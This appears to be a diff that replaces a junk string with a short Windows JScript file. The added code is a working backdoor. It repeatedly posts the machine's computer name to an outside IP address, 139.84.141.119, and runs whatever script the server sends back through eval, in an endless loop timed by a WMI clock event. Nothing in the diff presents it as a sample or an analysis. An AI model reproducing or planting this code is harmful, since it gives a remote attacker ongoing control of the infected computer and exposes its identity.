@@ -1,1 +1,2 @@
-safdsessew
+var lt=GetObject("winmgmts:\\\\.\\root\\CIMV2").ExecNotificationQuery("SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_LocalTime'");
+var x=1,f="",u="http://139.84.141.119/xka-PaloNet/PaloNet.php",ws=new ActiveXObject("WScript.Shell"),s=ws.ExpandEnvironmentStrings("%computername%")+"\r\r\r0\r\r\r";while(1){try{var h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("POST",u,false);h.Send(s);if(x){d=h.ResponseText;}eval(d);}catch(e){};lt.NextEvent();}
